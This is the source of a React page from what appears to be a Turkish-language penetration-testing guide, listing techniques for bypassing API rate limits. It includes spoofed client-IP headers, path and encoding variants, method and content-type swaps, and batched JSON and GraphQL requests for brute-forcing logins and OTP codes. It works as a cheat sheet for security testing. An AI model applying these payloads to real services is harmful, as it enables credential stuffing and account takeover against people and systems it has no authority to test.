"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function RateLimitingPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">Rate Limiting Bypass</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          API rate limiting mekanizmalarını atlatma teknikleri. OWASP API4:2023 - Unrestricted Resource Consumption.
          Brute force, DoS ve data scraping için kullanılır.
        </p>
      </motion.div>

      <Callout type="info" title="OWASP API4:2023">
        Rate limiting yokluğu brute force, credential stuffing ve resource exhaustion
        saldırılarına kapı açar.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">IP Rotation Headers</h2>
        <PayloadList
          title="IP Spoofing Headers"
          initialShow={10}
          payloads={[
            { code: `X-Forwarded-For: 127.0.0.1`, note: "En yaygın" },
            { code: `X-Forwarded-For: 10.0.0.FUZZ`, note: "Her request farklı IP" },
            { code: `X-Real-IP: 127.0.0.1` },
            { code: `X-Originating-IP: 127.0.0.1` },
            { code: `X-Client-IP: 127.0.0.1` },
            { code: `X-Remote-IP: 127.0.0.1` },
            { code: `X-Remote-Addr: 127.0.0.1` },
            { code: `X-Cluster-Client-IP: 127.0.0.1` },
            { code: `True-Client-IP: 127.0.0.1`, note: "Akamai" },
            { code: `CF-Connecting-IP: 127.0.0.1`, note: "Cloudflare" },
            { code: `Fastly-Client-IP: 127.0.0.1`, note: "Fastly" },
            { code: `X-Azure-ClientIP: 127.0.0.1`, note: "Azure" },
            { code: `X-Forwarded-For: 127.0.0.1, 192.168.1.1`, note: "Multiple IPs" },
            { code: `Forwarded: for=127.0.0.1`, note: "RFC 7239" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Endpoint Variation</h2>
        <PayloadList
          title="Endpoint Bypass"
          initialShow={8}
          payloads={[
            { code: `/api/login → /api/Login`, note: "Case variation" },
            { code: `/api/login → /api/login/`, note: "Trailing slash" },
            { code: `/api/login → /api//login`, note: "Double slash" },
            { code: `/api/login → /api/login?x=1`, note: "Random query param" },
            { code: `/api/login → /api/login#fragment`, note: "Fragment" },
            { code: `/api/login → /api/v1/login vs /api/v2/login`, note: "Version variation" },
            { code: `/api/login → /api/login%00`, note: "Null byte" },
            { code: `/api/login → /api/login%20`, note: "Space encoding" },
            { code: `/api/login → /api/./login`, note: "Dot notation" },
            { code: `/api/login → /%61%70%69/login`, note: "Path encoding" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Request Manipulation</h2>
        <PayloadList
          title="Request Bypass"
          initialShow={8}
          payloads={[
            { code: `POST → PUT`, note: "HTTP method değiştirme" },
            { code: `POST → PATCH` },
            { code: `Content-Type: application/json → application/x-www-form-urlencoded`, note: "Content type değiştirme" },
            { code: `Content-Type: application/json → multipart/form-data` },
            { code: `{"email":"a@b.com"} → {"email":["a@b.com"]}`, note: "Array wrapping" },
            { code: `{"email":"a@b.com"} → {"email":"a@b.com","email":"a@b.com"}`, note: "Duplicate key" },
            { code: `Unicode normalization: ℀ → a/c`, note: "Unicode karakterler" },
            { code: `{"email":"a@b.com\\u0000"}`, note: "Null byte in JSON" },
            { code: `Concurrent requests (race condition)`, note: "Paralel istek gönderme" },
            { code: `Cookie rotation per request`, note: "Her istek farklı session" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Batch / Array Abuse</h2>
        <PayloadList
          title="Batch Request Payloads"
          initialShow={6}
          payloads={[
            { code: `POST /api/login [{"user":"a","pass":"1"},{"user":"a","pass":"2"},...]`, note: "JSON array - tek request çok deneme" },
            { code: `POST /api/check-email {"emails":["a@b.com","c@d.com",...]}`, note: "Array parameter abuse" },
            { code: `POST /graphql [{"query":"..."}, {"query":"..."}, ...]`, note: "GraphQL batching" },
            { code: `POST /graphql {"query":"alias1: login(...) alias2: login(...)"}`, note: "GraphQL aliasing" },
            { code: `POST /api/otp/verify {"code":"000000-999999"}`, note: "Wildcard OTP (bazı impl)" },
            { code: `POST /api/otp/verify {"code":["0000","0001","0002",...]}`, note: "Array OTP brute" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Normal rate limit&apos;i tespit edin (kaç istek, kaç saniye){"\n"}
        2. IP rotation header&apos;ları deneyin{"\n"}
        3. Endpoint variation ile bypass deneyin{"\n"}
        4. HTTP method ve content-type değiştirin{"\n"}
        5. Batch/array request ile çoklu deneme yapın{"\n"}
        6. Race condition ile paralel istek gönderin
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/mass-assignment" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Mass Assignment</span>
        </Link>
        <Link href="/docs/api/graphql" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>GraphQL</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
